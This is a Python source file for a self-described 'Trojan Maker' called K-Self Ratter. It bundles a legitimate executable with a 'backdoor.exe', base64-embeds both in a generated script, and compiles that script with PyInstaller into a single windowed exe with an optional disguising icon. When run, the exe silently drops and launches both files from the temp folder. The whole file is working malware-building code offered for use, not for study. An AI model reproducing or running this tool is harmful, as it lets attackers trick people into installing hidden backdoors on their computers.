import os
import base64
import random
import string
import subprocess

def banner():
    print('''
##########################################################################
#                                                                        #
#        K-Self Ratter - Sneaky Exe Joiner (Trojan Maker)               #
#                                                                        #
#                                                                        #
#                                  K$$hr                                 #
#                                                                        #
#        Whazzup with K-Self Ratter?                                    #
#                                                                        #
# K-Self Ratter is all about joining files, like a ninja SFX.            #
# The big deal here is that K-Self Ratter extracts files                 #
# straight into the temp folder and makes them do the hustle.            #
#                                                                        #
#                                                                        #
# Why use K-Self Ratter?                                                 #
#                                                                        #
# To whip up a sweet Trojan Horse.                                      #
# Imagine you got two files. First, a legit software ("game.exe")        #
# and then, a sneaky one ("backdoor.exe").                               #
# K-Self Ratter combines them into one file: "k_file.exe".              #
# "k_file.exe", when kicked off, unpacks and goes wild with              #
# first ("game.exe") and second ("backdoor.exe") files.                  #
#                                                                        #
#                                                                        #
# How to roll with K-Self Ratter?                                        #
#                                                                        #
# Picture this: "game.exe" is the first file. Type "game.exe"            #
# when K-Self Ratter asks you "1st file: "                                #
# "backdoor.exe" is the second file. Type "backdoor.exe"                 #
# when K-Self Ratter says "2nd file: "                                    #
#                                                                        #
#                                                                        #
# Voila! "C:\\KSR_Output\\k_file.exe" pops outta nowhere.                #
#                                                                        #
#                                                                        #
##########################################################################
''')

def command_exists(command):
    extensions = os.environ.get("PATHEXT", "").split(os.pathsep)
    for path in os.environ["PATH"].split(os.pathsep):
        for ext in extensions:
            executable_path = os.path.join(path, command + ext)
            if os.path.isfile(executable_path) and os.access(executable_path, os.X_OK):
                return True
    return False
    
if command_exists('python') or command_exists('py') or command_exists('python3'):
    print(f"Python is installed ;)")
else:
    print(f"Python needs to be installed")
    print('Can be installed from: https://www.youtube.com/watch?v=YKSpANU8jPE&ab_channel=PythonProgrammer')
    os.system('pause')
    exit()

if command_exists('pyinstaller'):
    print(f"pyinstaller is installed ;)")
else:
    print(f"pyinstaller needs to be installed")
    os.system('pip install pyinstaller')

class FileExtensionError(Exception):
    def __str__(self):
        return 'File is not ".ico"'

class File:
    def __init__(self, name):
        self.name = name
        self.random_name = "".join(random.choice(string.ascii_letters + string.digits) for x in range(15))
        self.extension = os.path.splitext(self.name)[1]

    @staticmethod
    def create_py_file(file1, file2):
        with open(file1.name, 'rb') as file_n1:
            with open(file2.name, 'rb') as file_n2:
                if not os.path.exists('C:\\KSR_Output'):
                    os.mkdir('C:\\KSR_Output')
                with open('C:\\KSR_Output\\k_file.pyw', 'w') as py_file:
                    py_file.write(f'''import os, base64, tempfile, subprocess

def join(file_content, file_name, file_extension):
    temp_dir = tempfile.gettempdir()
    temp_file_path = os.path.join(temp_dir, file_name + file_extension)
    if not os.path.exists(temp_file_path):
        with open(temp_file_path, "wb") as output_file:
            output_file.write(base64.b64decode(file_content))
    subprocess.Popen(temp_file_path, shell=True)

file1_content = "{base64.b64encode(file_n1.read()).decode('utf-8')}"
file2_content = "{base64.b64encode(file_n2.read()).decode('utf-8')}"

join(file1_content, "{file1.random_name}", "{file1.extension}")
join(file2_content, "{file2.random_name}", "{file2.extension}")''')

    @staticmethod
    def compile_with_PyInstaller():
        while True:
            wanna_icon = input('Icon? (y)es, (n)o: ').lower()
            if wanna_icon == 'y' or wanna_icon == 'yes':
                icon = input('Icon: ')
                if not os.path.exists(icon):
                    raise FileNotFoundError(f'Icon "{icon}" not found')
                if os.path.splitext(icon)[1] != '.ico':
                    raise FileExtensionError

                print('Hang tight, PyInstaller is cooking...')
                os.system(f'pyinstaller'
                          f' --distpath C:\\KSR_Output'
                          f' --workpath C:\\KSR_Output'
                          f' --specpath C:\\KSR_Output'
                          f' --icon "{icon}" --windowed --onefile C:\\KSR_Output\\k_file.pyw')
                break

            elif wanna_icon == 'n' or wanna_icon == 'no':
                print('Hold on, PyInstaller is on it...')
                os.system('pyinstaller'
                          ' --distpath C:\\KSR_Output'
                          ' --workpath C:\\KSR_Output'
                          ' --specpath C:\\KSR_Output'
                          ' --windowed --onefile C:\\KSR_Output\\k_file.pyw')
                break

            else:
                print('Only (y)es or (n)o')

        print('\nDone! Files are in C:\\KSR_Output')
        os.system('pause')
        exit()

def main():
    banner()
    try:
        file1 = File(input('1st file: '))
        file2 = File(input('2nd file: '))
    
        if not os.path.exists(file1.name) or not os.path.exists(file2.name):
            print("One or both input files don't exist.")
            return

        File.create_py_file(file1, file2)
        File.compile_with_PyInstaller()
    
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
